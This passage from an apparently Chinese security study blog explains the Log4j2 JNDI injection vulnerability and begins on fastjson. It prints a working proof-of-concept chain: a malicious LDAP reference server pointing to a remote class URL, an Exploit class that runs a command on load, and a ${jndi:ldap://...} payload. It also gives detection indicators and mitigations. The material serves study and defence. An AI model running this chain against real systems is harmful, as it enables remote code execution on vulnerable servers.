class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、升级Apache Shiro到最版本</span><br><span class=\"line\">2、部署安全产品</span><br></pre></td></tr></table></figure>\n<h3 id=\"log4j2-反序列化\"><a class=\"markdownIt-Anchor\" href=\"#log4j2-反序列化\">#</a> log4j2 反序列化</h3>\n<p>Log for Java，Apache 的开源日志记录组件，使用非常广泛</p>\n<blockquote>\n<p>使用方法：</p>\n<p>1、pom 引入依赖</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependencies&gt;</span><br><span class=\"line\">    &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">    &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;6.0.3&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;dependency&gt;</span><br><span class=\"line\">        &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class=\"line\">        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class=\"line\">        &lt;version&gt;5.1.35&lt;/version&gt;</span><br><span class=\"line\">    &lt;/dependency&gt;</span><br><span class=\"line\">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>\n<p>2、获得 logger 实例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.logging.log4j.LogManager;</span><br><span class=\"line\">import org.apache.logging.log4j.Logger;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Log4JTest &#123;</span><br><span class=\"line\">    private static final Logger logger = LogManager.getLogger(Log4JTest.class);</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(&quot;wuya 666&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // logger.error(&quot;wuya 666&quot;);</span><br><span class=\"line\">        //logger.error(&quot;$&#123;java:runtime&#125; - $&#123;java:vm&#125; - $&#123;java:os&#125;&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>3、其中 Log4j 包括的日志等级层级分别为：ALL &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF。</p>\n<p>在默认情况下，会输出 WARN/ERROR/FATAL 等级的日志。可以使用配置文件更改日志输出等级：</p>\n<p>log4j2 日志与 print 的区别</p>\n<p>可以输出到文件</p>\n<p>可以输出不同类型级别的日志</p>\n<p>上线时不需要修改，不需要删除 println</p>\n<p>便于分析追溯切割</p>\n</blockquote>\n<p>LDAP</p>\n<p>轻量级目录访问协议</p>\n<p>目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象 Linux/Unix 系统中的文件目录一样。</p>\n<p>可以通过 LDAP 协议，传一个 name 进去，就能获取到数据。</p>\n<p>LDAP 在统一身份认证领域比较多，比如 Windows 的域环境</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140137271.png\" alt=\"image-20221126140137271\"></p>\n<p>LDAP 的树状结构组织数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125195016231.png\" alt=\"image-20221125195016231\"></p>\n<p>LDAP 适合 C/S 架构，SSO (单点登录) 适合 B/S 架构</p>\n<p>JNDI</p>\n<p>Java 命名和目录接口（命名服务接口）</p>\n<p>用于根据名字找到位置、服务、信息、资源、对象等 K V</p>\n<p>可以理解为有一个类似于字典的数据源，你可以通过 JNDI 接口，传一个 name 进去，就能获取到对象了。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/bfd6e2fc555bc73870672c5c8fe5e548.png\" alt=\"图片\"></p>\n<p>JNDI 基本操作：</p>\n<p>1、发布服务（名字和资源的映射）： bind ()</p>\n<p>2、用名字查找资源： lookup ()</p>\n<p>采用 JNDI 方式连接数据库，我们无需在关注数据库的连接参数，当参数改变，我们的调用代码不发生改变</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void jndiConnet() throws SQLException, NamingException &#123;</span><br><span class=\"line\">        Context ctx=new InitialContext();</span><br><span class=\"line\">        Object datasourceRef=ctx.lookup(&quot;java:jdbc/mydatasource&quot;);</span><br><span class=\"line\">        DataSource ds=(DataSource)datasourceRef;</span><br><span class=\"line\">        Connection conn=ds.getConnection();</span><br><span class=\"line\"></span><br><span class=\"line\">        Statement st=conn.createStatement();</span><br><span class=\"line\">        ResultSet rs=st.executeQuery(&quot;select * from users where id =1 &quot;);</span><br><span class=\"line\">        while(rs.next())&#123;</span><br><span class=\"line\">            System.out.println(</span><br><span class=\"line\">                    &quot;name:&quot;+rs.getString(&quot;name&quot;)+&quot;\\n&quot;</span><br><span class=\"line\">                            +&quot;password:&quot;+rs.getString(&quot;password&quot;));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        rs.close();</span><br><span class=\"line\">        st.close();</span><br><span class=\"line\">        conn.close();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140836409.png\" alt=\"image-20221126140836409\"></p>\n<p>JNDI 可以访问：</p>\n<p>LDAP 目录服务、RMI 远程方法调用、DNS、XNam 、Novell 目录服务、 CORBA 对象服务、文件系统、WindowsXP/2000/NT/Me/9x 的注册表、DSMLv1&amp;v2、NIS</p>\n<p>而这些通过 lookup 方法完成</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140957355.png\" alt=\"image-20221126140957355\"></p>\n<p>lookup</p>\n<p>假如现在想要通过日志输出一个 Java 对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，可以使用 lookup 查找</p>\n<p>lookup 相当于是一个接口，具体去哪里查找，怎么查找，就需要编写具体的模块去实现了，类似于面向对象编程中多态那意思。</p>\n<p>JNDI 可以使用 lookup 查找 docker,java,jndi,log4j 等内容</p>\n<p>JNDI 和 LDAP 关系</p>\n<p jndi:ldap:wuya.com:5678test=\"\">$</p>\n<p>通过名字，查找（lookup）LDAP 的服务，获取 LDAP 中存储的数据</p>\n<p>下面举了个例子，通过 JNDI 查找 LDAP 中的 UID 和 DN</p>\n<p>server:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class LDAPSeriServer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class=\"line\">    public static void main(String[] args) throws IOException &#123;</span><br><span class=\"line\">        int port = 7389;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class=\"line\">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class=\"line\">                    &quot;listen&quot;, //$NON-NLS-1$</span><br><span class=\"line\">                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$</span><br><span class=\"line\">                    port,</span><br><span class=\"line\">                    ServerSocketFactory.getDefault(),</span><br><span class=\"line\">                    SocketFactory.getDefault(),</span><br><span class=\"line\">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class=\"line\">            config.setSchema(null);</span><br><span class=\"line\">            config.setEnforceAttributeSyntaxCompliance(false);</span><br><span class=\"line\">            config.setEnforceSingleStructuralObjectClass(false);</span><br><span class=\"line\">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class=\"line\">            ds.add(&quot;dn: &quot; + &quot;dc=example,dc=com&quot;, &quot;objectClass: top&quot;, &quot;objectclass: domain&quot;);</span><br><span class=\"line\">            ds.add(&quot;dn: &quot; + &quot;ou=employees,dc=example,dc=com&quot;, &quot;objectClass: organizationalUnit&quot;, &quot;objectClass: top&quot;);</span><br><span class=\"line\">            ds.add(&quot;dn: &quot; + &quot;uid=wuya,ou=employees,dc=example,dc=com&quot;, &quot;objectClass: ExportObject&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$</span><br><span class=\"line\">            ds.startListening();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>client</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class JNDIClient &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws NamingException &#123;</span><br><span class=\"line\">        Hashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();</span><br><span class=\"line\">        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);</span><br><span class=\"line\">        env.put(Context.PROVIDER_URL, &quot;ldap://localhost:7389/dc=example,dc=com&quot;);</span><br><span class=\"line\">        //env.put(Context.SECURITY_AUTHENTICATION, &quot;simple&quot;);</span><br><span class=\"line\">        //env.put(Context.SECURITY_PRINCIPAL, &quot;cn=admin,dc=wuya,dc=net&quot;);</span><br><span class=\"line\">        //env.put(Context.SECURITY_CREDENTIALS, &quot;wuya&quot;);</span><br><span class=\"line\">        DirContext ctx = new InitialDirContext(env);</span><br><span class=\"line\">        SearchControls searchControls = new SearchControls();</span><br><span class=\"line\">        searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);</span><br><span class=\"line\">        searchControls.setCountLimit(10);</span><br><span class=\"line\">        NamingEnumeration&lt;SearchResult&gt; namingEnumeration =</span><br><span class=\"line\">                ctx.search(&quot;&quot;, &quot;(uid=*)&quot;, new Object[]&#123;&#125;, searchControls);</span><br><span class=\"line\">        //通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称绑定了</span><br><span class=\"line\">        ctx.lookup(&quot;ldap://localhost:7389/ou=employees,dc=example,dc=com&quot;);</span><br><span class=\"line\">        while (namingEnumeration.hasMore()) &#123;</span><br><span class=\"line\">            SearchResult sr = namingEnumeration.next();</span><br><span class=\"line\">            System.out.println(&quot;DN: &quot; + sr.getName());</span><br><span class=\"line\">            System.out.println(sr.getAttributes().get(&quot;uid&quot;));</span><br><span class=\"line\">            //System.out.println(&quot;Password:&quot; + new String((byte[]) sr.getAttributes().get(&quot;userPassword&quot;).get()));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        ctx.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>JNDI 命名引用（Naming Reference）</p>\n<p>1、在 LDAP 里面可以存储一个外部的资源，叫做命名引用，对应 Reference 类比如远程 HTTP 服务的一个.class 文件</p>\n<p>2、如果 JNDI 客户端，在 LDAP 服务中找不到对应的资源 (test)，就去指定的地址请求。如果是命名引用，会把这个文件下载到本地</p>\n<p>3、如果下载的.class 文件包含无参构造函数或静态方法块，加载的时候会自动执行</p>\n<p>下面还有个例子，比如我们现在的 naming reference 是 Exploit，那么在 LDAP 服务中找不到对应的资源，会把刚刚的 class 下载到本地</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class LDAPRefServer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    /**</span><br><span class=\"line\">     * class地址 用#Exploit代替Exploit.class</span><br><span class=\"line\">     */</span><br><span class=\"line\">    private static final String EXPLOIT_CLASS_URL = &quot;http://192.168.142.66:80/#Exploit&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        int port = 7912;</span><br><span class=\"line\"></span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class=\"line\">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class=\"line\">                    &quot;listen&quot;,</span><br><span class=\"line\">                    InetAddress.getByName(&quot;0.0.0.0&quot;),</span><br><span class=\"line\">                    port,</span><br><span class=\"line\">                    ServerSocketFactory.getDefault(),</span><br><span class=\"line\">                    SocketFactory.getDefault(),</span><br><span class=\"line\">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class=\"line\"></span><br><span class=\"line\">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(EXPLOIT_CLASS_URL)));</span><br><span class=\"line\">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class=\"line\">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);</span><br><span class=\"line\">            ds.startListening();</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        private URL codebase;</span><br><span class=\"line\">        public OperationInterceptor(URL cb) &#123;</span><br><span class=\"line\">            this.codebase = cb;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void processSearchResult(InMemoryInterceptedSearchResult result) &#123;</span><br><span class=\"line\">            String base = result.getRequest().getBaseDN();</span><br><span class=\"line\">            Entry e = new Entry(base);</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                sendResult(result, base, e);</span><br><span class=\"line\">            &#125; catch (Exception e1) &#123;</span><br><span class=\"line\">                e1.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException &#123;</span><br><span class=\"line\">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));</span><br><span class=\"line\">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class=\"line\">            e.addAttribute(&quot;javaClassName&quot;, &quot;Calc&quot;);</span><br><span class=\"line\">            String cbstring = this.codebase.toString();</span><br><span class=\"line\">            int refPos = cbstring.indexOf(&#x27;#&#x27;);</span><br><span class=\"line\">            if (refPos &gt; 0) &#123;</span><br><span class=\"line\">                cbstring = cbstring.substring(0, refPos);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><br><span class=\"line\">            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$</span><br><span class=\"line\">            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><br><span class=\"line\">            result.sendSearchEntry(e);</span><br><span class=\"line\">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Exploit &#123;</span><br><span class=\"line\">    public Exploit() &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class=\"line\">        &#125; catch (IOException var1) &#123;</span><br><span class=\"line\">            var1.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>漏洞原理分析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126142622854.png\" alt=\"image-20221126142622854\"></p>\n<p>payload:</p>\n<p>logger.error(&quot;${jndi:ldap://wuya.com:5678/test}&quot;);</p>\n<p>1. 首先攻击者控制远程 http 服务器和 ldap 目录服务，http 服务器上存在恶意静态方法，LDAP 目录服务上？</p>\n<p>2. 攻击者通过一些方法传入我们的 payload</p>\n<p>由于 java 中 {} 可以解析变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Main &#123;</span><br><span class=\"line\">    private static  final  Logger logger = LogManager.getLogger();</span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        String content = &quot;world&quot;;</span><br><span class=\"line\">        logger.trace(&quot;hello &#123;&#125;&quot;,content);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Main &#123;</span><br><span class=\"line\">    private static  final  Logger logger = LogManager.getLogger();</span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        String content = &quot;world&quot;;</span><br><span class=\"line\">        logger.trace(&quot;hello &#123;&#125;&quot;,content);</span><br><span class=\"line\"></span><br><span class=\"line\">        //https://logging.apache.org/log4j/2.x/manual/lookups.html</span><br><span class=\"line\">        String content2 = &quot;$&#123;java:os&#125;&quot;;</span><br><span class=\"line\">        logger.trace(&quot;hello &#123;&#125;&quot;,content2);</span><br><span class=\"line\">        String content3 = &quot;$&#123;java:vm&#125;&quot;;</span><br><span class=\"line\">        logger.trace(&quot;hello &#123;&#125;&quot;,content3);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>进一步解析 {}，发现是 JNDI 扩展内容。</p>\n<p>再进一步解析，发现了是 LDAP 协议，LDAP 服务器在 127.0.0.1，要查找的 key 是 exploit。</p>\n<p>最后，调用具体负责 LDAP 的模块去请求对应的数据。</p>\n<p>3。从指定动态地址下载对象。由于 ldap 目录中不存在 Exploit 类，因此会向远程 http 服务器请求</p>\n<p>通过命令引用可以远程下载一个 class 文件，然后下载后加载起来构建对象。</p>\n<p>由于代码在 NamingManager.java 中创建实例，导致静态方法自动执行，如果远程下载的文件中有恶意代码，也会自动执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@SuppressWarnings(&quot;deprecation&quot;) // Class.newInstance</span><br><span class=\"line\">ObjectFactory result = (clas != null) ? (ObjectFactory) clas.newInstance() : null;</span><br><span class=\"line\">return result;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>影响版本</p>\n<p>1、使用了 log4j 的组件，并且版本在 2.x &lt;= 2.14.1</p>\n<p>2、JDK 版本小于 8u191、7u201、6u211</p>\n<p>资产排查</p>\n<p>1、pom 版本检查</p>\n<p>2、可以通过检查日志中是否存在 “jndi:ldap://” 、“jndi:rmi” 、 “<span class=\"exturl\" data-url=\"aHR0cDovL2Ruc2xvZy5jbg==\">dnslog.cn</span>” 等字符来发现可能的攻击行为。</p>\n<p>3、检查日志中是否存在相关堆栈报错，堆栈里是否有 JndiLookup、ldapURLContext、getObjectFactoryFromReference 等与 jndi 调用相关的堆栈信息</p>\n<p>修复思路</p>\n<p>1、禁止用户请求参数出现攻击关键字</p>\n<p>2、禁止 lookup 下载远程文件（命名引用）</p>\n<p>3、禁止 Log4j 的应用连接外网</p>\n<p>4、禁止 Log4j 使用 lookup</p>\n<p>5、从 Log4j jar 包中中删除 lookup 2.10 以下</p>\n<p>1、将 Log4j 框架升级到 2.17.1 版本</p>\n<p>2、使用安全产品防护：WAF、RASP……</p>\n<p>临时方案</p>\n<p>1、升级 JDK</p>\n<p>2、修改 Log4j 配置</p>\n<p>3、删除 JndiLookup.class</p>\n<p>1、设置参数：</p>\n<p>log4j2.formatMsgNoLookups=True</p>\n<p>2、修改 JVM 参数：</p>\n<p>-Dlog4j2.formatMsgNoLookups=true</p>\n<p>3、系统环境变量：</p>\n<p>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true</p>\n<p>4、禁止使用了 Log4j2 的应用所在服务器外连</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzODQyMDkzL2FydGljbGUvZGV0YWlscy8xMjIwNzQwMjA=\">(70 条消息) log4j2 漏洞_Archie_java 的博客 - CSDN 博客_log4j2 漏洞</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvNDkyMC5odG1s\">浅谈 Log4j2 漏洞 | NOSEC 安全讯息平台 - 白帽汇安全研究院</span></p>\n<h3 id=\"fastjson-反序列化\"><a class=\"markdownIt-Anchor\" href=\"#fastjson-反序列化\">#</a> fastjson 反序列化</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvZmFzdGpzb24vd2lraS9RdWljay1TdGFydC1DTg==\">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</span> 1.2.76</p>\n<p>l 速度快</p>\n<p>l 使用广泛</p>\n<p>l 测试完备</p>\n<p>l 使用简单</p>\n<p>l 功能完备</p>\n<p><strong>序列化的时候，会调用成员变量的 get 方法，私有成员变量不会被序列化。</strong></p>\n<p><strong>反序列化的时候，会调用成员变量的类的构造方法，set 方法，public 修饰的成员全部自动赋值。</strong></p>\n<p>反序列化代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span 